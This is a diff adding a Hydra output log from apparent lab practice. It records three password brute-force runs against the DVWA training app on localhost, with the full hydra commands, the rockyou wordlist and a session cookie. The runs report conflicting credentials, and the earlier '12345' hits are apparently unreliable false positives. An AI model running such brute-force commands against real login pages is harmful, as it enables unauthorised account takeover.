@@ -1,0 +1,6 @@
+# Hydra v9.5 run at 2025-05-28 19:44:38 on 127.0.0.1 http-get-form (hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f -o hydra.out 127.0.0.1 http-get-form /DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^:F=Login failed)
+[80][http-get-form] host: 127.0.0.1   login: admin   password: 12345
+# Hydra v9.5 run at 2025-05-28 19:47:14 on 127.0.0.1 http-get-form (hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f -o hydra.out 127.0.0.1 http-get-form /DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^:F=Username and/or password incorrect.)
+[80][http-get-form] host: 127.0.0.1   login: admin   password: 12345
+# Hydra v9.5 run at 2025-05-28 19:50:41 on 127.0.0.1 http-get-form (hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f -o hydra.out 127.0.0.1 http-get-form /DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:security=low;PHPSESSID=6d47f655925e3659021926ab54c77a0d:F=Username and/or password incorrect.)
+[80][http-get-form] host: 127.0.0.1   login: admin   password: password
